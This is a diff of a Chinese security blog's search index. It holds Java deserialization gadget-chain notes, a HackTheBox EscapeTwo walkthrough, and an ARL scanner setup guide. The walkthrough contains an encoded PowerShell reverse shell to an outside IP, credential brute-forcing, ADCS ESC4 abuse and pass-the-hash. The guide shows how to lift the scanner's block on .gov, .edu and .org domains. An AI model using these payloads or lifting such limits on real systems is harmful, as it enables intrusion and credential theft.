+<h2 id="HashMap-版利用链"><a href="#HashMap-版利用链" class="headerlink" title="HashMap 版利用链"></a>HashMap 版利用链</h2><p>要实现反序列化命令执行，最基础的思路是通过 Runtime.exec() 触发计算器：</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;calc.exe&quot;);</span><br></pre></td></tr></table></figure></div>
 
 <p>但我们不能直接调用 exec()，因此需要在 commons-collections 依赖中找到一个可利用的调用链来在反序列化时触发这个命令。</p>
@@ -1052,7 +1345,7 @@
 
 
 
-<h3 id="HashSet-版利用链"><a href="#HashSet-版利用链" class="headerlink" title="HashSet 版利用链"></a>HashSet 版利用链</h3><p>在 ysoserial 项目 cc6 payload 中，调用链入口是 HashSet，再到 HashMap，其他一致</p>
+<h2 id="HashSet-版利用链"><a href="#HashSet-版利用链" class="headerlink" title="HashSet 版利用链"></a>HashSet 版利用链</h2><p>在 ysoserial 项目 cc6 payload 中，调用链入口是 HashSet，再到 HashMap，其他一致</p>
 <img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250129213907608.png" class title="image-20250129213907608">
 
 <p>依然回到 hashCode 的分析上，前面都一致</p>
@@ -1071,7 +1364,7 @@
 
 
 
-<h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2><h3 id="TransformedMap-版"><a href="#TransformedMap-版" class="headerlink" title="TransformedMap 版"></a>TransformedMap 版</h3><p>在已经分析过 CC6 的前提下分析 CC1，从 ChainedTransfomer#transform 继续往前找调用链</p>
+<h1 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h1><h2 id="TransformedMap-版"><a href="#TransformedMap-版" class="headerlink" title="TransformedMap 版"></a>TransformedMap 版</h2><p>在已经分析过 CC6 的前提下分析 CC1，从 ChainedTransfomer#transform 继续往前找调用链</p>
 <img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250204165540576.png" class title="image-20250204165540576">
 
 <p>在 TransformedMap#checkSetValue 方法调用了 transform，且该方法为 protected 修饰</p>
@@ -1112,7 +1405,7 @@
 
 
 
-<h3 id="Ysoserial-版"><a href="#Ysoserial-版" class="headerlink" title="Ysoserial 版"></a>Ysoserial 版</h3><p>Ysoserial 的链子是利用代理模式，与 TransformedMap 版大有不同。</p>
+<h2 id="Ysoserial-版"><a href="#Ysoserial-版" class="headerlink" title="Ysoserial 版"></a>Ysoserial 版</h2><p>Ysoserial 的链子是利用代理模式，与 TransformedMap 版大有不同。</p>
 <p>视线回到 LazyMap#get，接着往前寻找调用 get 方法的类</p>
 <img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250207160256483.png" class title="image-20250207160256483">
 
@@ -1149,209 +1442,22 @@
       </tags>
   </entry>
   <entry>
-    <title>HackTheBox - EscapeTwo</title>
-    <url>/2025/03/05/HackTheBox-EscapeTwo/</url>
-    <content><![CDATA[<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221181200747.png" class title="image-20250221181200747">
-
-
-
-<p>分配IP：10.10.11.51</p>
-<p><strong>已有凭证</strong></p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">rose/KxEPkKe6R8su</span><br></pre></td></tr></table></figure></div>
-
-
-
-<h2 id="外网信息探测"><a href="#外网信息探测" class="headerlink" title="外网信息探测"></a>外网信息探测</h2><p>使用 rustscan 进行对目标全端口扫描</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">rustscan -a escapetwo.htb -r 1-65535 --ulimit 5000 | tee res</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250220212000360.png" class title="image-20250220212000360">
-
-<p>将靶机TCP开放端口号提取并保存，交给 nmap 指定端口进行详细扫描</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ports=$(grep -oP &#x27;(?&lt;=:)\d+&#x27; res | grep -vE &#x27;^19$&#x27; | paste -sd,) &amp;&amp; echo $ports</span><br></pre></td></tr></table></figure></div>
-
-<p><strong>Nmap 服务版本探测</strong></p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -Pn -A -sV -p$ports sequel.htb</span><br></pre></td></tr></table></figure></div>
-
-<p>结果显示 AD域名：sequel.htb；对方还开放了几个重要端口：389、636等 LDAP服务，445 SMB服务，1433 MSSQL服务、5985 winrm服务等</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250220215413987.png" class title="image-20250220215413987">
-
-<p>对目标 TCP 开放端口进行漏洞扫描</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sT -p$ports --script=vuln -O -Pn sequel.htb</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221095444635.png" class title="image-20250221095444635">
-
-<p>对目标常用 UDP 端口进行扫描</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221095542904.png" class title="image-20250221095542904">
-
-<p>对目标 UDP 开放端口进行脚本、服务扫描</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221100353637.png" class title="image-20250221100353637">
-
-<h3 id="SMB-共享服务测试"><a href="#SMB-共享服务测试" class="headerlink" title="SMB 共享服务测试"></a>SMB 共享服务测试</h3><p>已知目标445端口smb服务开放，且已有凭证中提供了一串账号密码，先对此进行测试</p>
-<p>直接尝试连接，登录成功</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient -L \\10.10.11.51 -U rose</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250218160440000.png" class title="image-20250218160440000">
-
-<p>有许多共享文件夹，使用 smbmap 查看文件夹权限</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbmap -u &#x27;rose&#x27; -p &#x27;KxEPkKe6R8su&#x27; -H sequel.htb</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250220200151475.png" class title="image-20250220200151475">
-
-<p>递归 Accounting Department 目录， 在 Accouting Department 目录中发现表格文件</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbmap -u &#x27;rose&#x27; -p &#x27;KxEPkKe6R8su&#x27; -H sequel.htb -r &#x27;Accounting Department&#x27;A</span><br></pre></td></tr></table></figure></div>
-
- <img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221101012418.png" class title="image-20250221101012418">
-
-<p>将文件下载至本地</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbmap -u &#x27;rose&#x27; -p &#x27;KxEPkKe6R8su&#x27; -H sequel.htb -r &#x27;Accounting Department&#x27; --download &#x27;./Accounting Department/accounts.xlsx&#x27;</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221101421135.png" class title="image-20250221101421135">
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250218192424712.png" class title="image-20250218192424712">
-
-<p>accouts.xlsx 内部有用户凭据</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250219105017703.png" class title="image-20250219105017703">
-
-<h2 id="边界突破"><a href="#边界突破" class="headerlink" title="边界突破"></a>边界突破</h2><h3 id="nxc-服务爆破"><a href="#nxc-服务爆破" class="headerlink" title="nxc 服务爆破"></a>nxc 服务爆破</h3><p>将收集到的账号密码整理，尝试爆破 winrm 远程登录，可惜都失败了</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nxc winrm sequel.htb -u user.txt -p pass.txt</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221102002249.png" class title="image-20250221102002249">
-
-<p>想到 sa 用户是 MSSQL 数据库的默认用户，尝试跑一下 MSSQL</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nxc mssql sequel.htb -u user.txt -p pass.txt --local-auth --continue-on-success</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250220162537659.png" class title="image-20250220162537659">
-
-<p>使用成功的账号密码登录 MSSQL，成功连接，获得 miscrosft-server 数据库权限</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250219152613878.png" class title="image-20250219152613878">
-
-<h3 id="xp-cmdshell-执行权限获取"><a href="#xp-cmdshell-执行权限获取" class="headerlink" title="xp_cmdshell 执行权限获取"></a>xp_cmdshell 执行权限获取</h3><p>当前数据库用户权限级高，xp_cmdshell 为关闭状态，因此配置开启</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250219160254107.png" class title="image-20250219160254107">
-
-<p>拿到 xp_cmdshell 执行权限后，初步拿到主机用户权限了</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250219162214365.png" class title="image-20250219162214365">
-
-<p>反弹 shell 一下</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250219184700409.png" class title="image-20250219184700409">
-
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec xp_cmdshell &#x27;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwAyACIALAA3ADcAOAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==&#x27;</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250219184731271.png" class title="image-20250219184731271">
-
-<p>如果遇到 MSSQL 命令行不能输入太多字符的问题，使用 MSSQL 反弹脚本工具也可以</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(mighty㉿kali)-[~/tools/Script/MSSQL/mssql-command-tools]</span><br><span class="line">└─$ ./mssql-command-tools_Linux_amd64 --host 10.10.11.51 -u &quot;sa&quot; -p &#x27;MSSQLP@ssw0rd!&#x27; -c &quot;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwAyACIALAA3ADcAOAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==&quot;</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="获取-ryan-用户登录凭证"><a href="#获取-ryan-用户登录凭证" class="headerlink" title="获取 ryan 用户登录凭证"></a>获取 ryan 用户登录凭证</h3><p>由于已知有一个数据库在运行，因此下一步是找配置文件，在根目录有清晰的数据库目录路径 <code>/SQL2019</code>。在翻阅配置文件时发现了有文本密码信息的配置文件 sql-Configuration.INI</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250219195059146.png" class title="image-20250219195059146">
-
-<p>将所有已知的用户名都写入文件中，使用 crackmapexec 尝试爆破</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.10.11.51 -u user.txt  -p WqSZAF6CysDQbGb3</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250219200417244.png" class title="image-20250219200417244">
-
-<p>爆破结果发现该密码是配对 ryan 用户的，使用 evil-winrm 远程登录，登录成功！</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -u ryan -p WqSZAF6CysDQbGb3 -i 10.10.11.51</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250219200645450.png" class title="image-20250219200645450">
-
-<p>拿到第一个旗帜</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250219202247547.png" class title="image-20250219202247547">
-
-<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="域环境分析"><a href="#域环境分析" class="headerlink" title="域环境分析"></a>域环境分析</h3><p>使用 netexec 获取 bloodhound 需要的域信息压缩文件</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nxc ldap sequel.htb -d sequel.htb -u &#x27;ryan&#x27; -p &#x27;WqSZAF6CysDQbGb3&#x27; --dns-server 10.10.11.51 --bloodhound -c All</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221104131070.png" class title="image-20250221104131070">
-
-<p>导入至 Bloodhound</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221104037805.png" class title="image-20250221103836269">
-
-<p>如图标显示，ryan 对 ca_svc 具有 WriteOwner 权限，拥有修改它的对象所有者的权限</p>
-<h3 id="证书模板滥用"><a href="#证书模板滥用" class="headerlink" title="证书模板滥用"></a>证书模板滥用</h3><p>修改 ca_svc 用户所有者为 ryan</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodyAD -d sequel.htb --dc-ip 10.10.11.51 --dns 10.10.11.51 -u &#x27;ryan&#x27; -p &#x27;WqSZAF6CysDQbGb3&#x27; set owner ca_svc ryan</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221113932108.png" class title="image-20250221113932108">
-
-<p>再将 ryan 用户对 ca_svc 用户的权限提升至完全控制</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 dacledit.py -action &#x27;write&#x27; -rights &#x27;FullControl&#x27; -principal &#x27;ryan&#x27; -target &#x27;ca_svc&#x27; &#x27;sequel.htb&#x27;/&#x27;ryan&#x27;:&#x27;WqSZAF6CysDQbGb3&#x27;</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221113918110.png" class title="image-20250221113918110">
-
-<p>与目标 NTP 服务器同步系统时间，前面 UDP 扫描对方开启了 123 NTP服务</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ntpdate sequel.htb</span><br></pre></td></tr></table></figure></div>
-
-<p>创建ca_svc用户影子证书</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy-ad shadow auto -u &#x27;ryan@sequel.htb&#x27; -p &#x27;WqSZAF6CysDQbGb3&#x27; -account &#x27;ca_svc&#x27; -target sequel.htb -dc-ip 10.10.11.51 -ns 10.10.11.51</span><br></pre></td></tr></table></figure></div>
-
-<p>同时获取到了用户NTLM密码哈希：3b181b914e7a9d5508ea1e20bc2b7fce</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221152638237.png" class title="image-20250221152638237">
-
-<p>上传 Certify.exe </p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">upload Certify.exe</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221160752219.png" class title="image-20250221160752219">
-
-<p>查看</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\Certify.exe find /domain:sequel.htb</span><br></pre></td></tr></table></figure></div>
-
-<p>关键部分，DunderMifflinAuthentication 这个模板能够被 Cert Publishers 组完全控制，且对 Domain Admins 具有注册权利。那么接下来我尝试寻找该模板漏洞，通过 certipy-ad 进行漏洞利用和模板重写来请求高权限证书</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221163706735.png" class title="image-20250221163706735">
-
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy-ad find -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -vulnerable -stdout</span><br></pre></td></tr></table></figure></div>
-
-<p>通过指定的用户名和哈希值在 Active Directory 中枚举与证书相关的漏洞信息。结果的确显示 DunderMifflinAuthentication 模板危险且具有 ESC4 漏洞</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221165240664.png" class title="image-20250221165240664">
-
-<p>重写该模板信息，使其符合攻击要求</p>
-<p>certipy-ad 和 ADCS 通过 自动更新模板权限，使得原本只能由 高权限用户（如 Domain Admins 或 Enterprise Admins） 使用的模板，可以被 低权限用户（如 ca_svc） 申请证书</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy-ad template -u ca_svc@sequel.htb -hashes &#x27;3b181b914e7a9d5508ea1e20bc2b7fce&#x27; -k -template &#x27;DunderMifflinAuthentication&#x27; -target DC01.sequel.htb -ns 10.10.11.51 -debug</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221170200646.png" class title="image-20250221170200646">
-
-<p>请求一份Administrator用户符合模板要求的证书，此处需要在更新模板后第一时间执行才能得到</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy-ad req -u ca_svc@sequel.htb -hashes &#x27;3b181b914e7a9d5508ea1e20bc2b7fce&#x27; -ca sequel-DC01-CA -template &#x27;DunderMifflinAuthentication&#x27; -upn Administrator@sequel.htb -target DC01.sequel.htb -ns 10.10.11.51 -dns 10.10.11.51 -dc-ip 10.10.11.51</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221172824755.png" class title="image-20250221172824755">
-
-<p>借助 pfx 证书通过身份认证</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy-ad auth -pfx administrator_10.pfx</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221180641755.png" class title="image-20250221180641755">
-
-<p><strong>PTH，通过 NTLM 哈希实现对目标系统的身份验证</strong></p>
-<p>通过上述哈希凭证登录靶机</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-psexec sequel.htb/administrator@10.10.11.51 -hashes &#x27;aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff&#x27;</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221180928423.png" class title="image-20250221180928423">
-
-<p>最后在 C:\Users\Administrator\Destop 目录中找到第二个旗帜</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221181045514.png" class title="image-20250221181045514">
-
-]]></content>
-      <categories>
-        <category>靶机系列</category>
-        <category>HackTheBox</category>
-      </categories>
-      <tags>
-        <tag>综合渗透靶机</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>资产侦察系统灯塔ARL优化</title>
     <url>/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/</url>
-    <content><![CDATA[<h2 id="灯塔介绍与安装"><a href="#灯塔介绍与安装" class="headerlink" title="灯塔介绍与安装"></a>灯塔介绍与安装</h2><p>灯塔一般用于自动化安全扫描，帮助发现和修复安全漏洞，适用于 Web 应用、API、安全配置等多个领域。它通过快速、全面的扫描和详细的报告，帮助开发人员、运维人员等及时了解并解决安全问题。</p>
+    <content><![CDATA[<h1 id="灯塔介绍与安装"><a href="#灯塔介绍与安装" class="headerlink" title="灯塔介绍与安装"></a>灯塔介绍与安装</h1><p>灯塔一般用于自动化安全扫描，帮助发现和修复安全漏洞，适用于 Web 应用、API、安全配置等多个领域。它通过快速、全面的扫描和详细的报告，帮助开发人员、运维人员等及时了解并解决安全问题。</p>
 <p><strong>初始账号密码：</strong></p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin/arlpass</span><br></pre></td></tr></table></figure></div>
 
 <img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207111703756.png" class title="image-20241207111703756">
 
-<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>选择灯塔魔改版下载，ARL-Puls 是基于灯塔ARL修改后的版本。相比原版，增加了OneForAll、中央<a class="link" href="https://so.csdn.net/so/search?q=%E6%95%B0%E6%8D%AE%E5%BA%93&spm=1001.2101.3001.7020">数据库<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，修改了altDns。</p>
+<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>选择灯塔魔改版下载，ARL-Puls 是基于灯塔ARL修改后的版本。相比原版，增加了OneForAll、中央<a class="link" href="https://so.csdn.net/so/search?q=%E6%95%B0%E6%8D%AE%E5%BA%93&spm=1001.2101.3001.7020">数据库<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，修改了altDns。</p>
 <p>Github地址：<a class="link" href="https://github.com/ki9mu/ARL-plus-docker">https://github.com/ki9mu/ARL-plus-docker<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
 <p>下载上传或克隆</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/ki9mu/ARL-plus-docker</span><br></pre></td></tr></table></figure></div>
 
 
 
-<h3 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h3><p>修改域名禁止项</p>
+<h2 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h2><p>修改域名禁止项</p>
 <p>灯塔中指定了无法扫描域名后缀 .edu .gov .org，开启 Docker 之前修改为不存在域名</p>
 <img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207102624762.png" class title="image-20241207102624762">
 
@@ -1363,7 +1469,7 @@
 
 
 
-<h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><p>先添加 Docker 数据卷</p>
+<h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><p>先添加 Docker 数据卷</p>
